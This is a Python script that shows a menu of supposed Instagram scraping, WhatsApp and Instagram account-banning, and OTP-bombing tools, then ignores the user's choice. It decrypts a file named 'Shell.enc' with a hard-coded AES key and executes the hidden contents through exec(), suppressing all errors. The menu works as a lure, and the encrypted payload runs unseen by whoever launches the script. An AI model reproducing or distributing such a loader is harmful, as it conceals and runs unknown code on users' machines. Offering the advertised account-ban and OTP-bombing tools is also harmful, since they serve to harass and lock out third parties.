import os
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

ENC_FILE = "Shell.enc"

KEY = b64decode("LrzLae/iO/QTu109CcAgw2Qxuxc+uftJk68cicdVXkU=")  # 32 bytes
BLOCK_SIZE = AES.block_size

def show_menu():
    from colorama import Fore, Style
    os.system("clear")
    print(Fore.YELLOW + "==================================")
    print("              Menu ")
    print("==================================")
    print("1. insta scrapper")
    print("2. Whatsapp ban v3")
    print("3. insta ban v2")
    print("4. OTP bomb")
    print("==================================" + Style.RESET_ALL)
    input(Fore.YELLOW + "Choose any option > " + Style.RESET_ALL)  

def decrypt_and_run():
    with open(ENC_FILE, "rb") as f:
        data = f.read()
    iv = data[:BLOCK_SIZE]
    ct = data[BLOCK_SIZE:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted_code = unpad(cipher.decrypt(ct), BLOCK_SIZE).decode("utf-8")
    exec(decrypted_code, {"__name__": "__main__"})

if __name__ == "__main__":
    try:
        show_menu()        
        decrypt_and_run()  
    except Exception:
        pass  
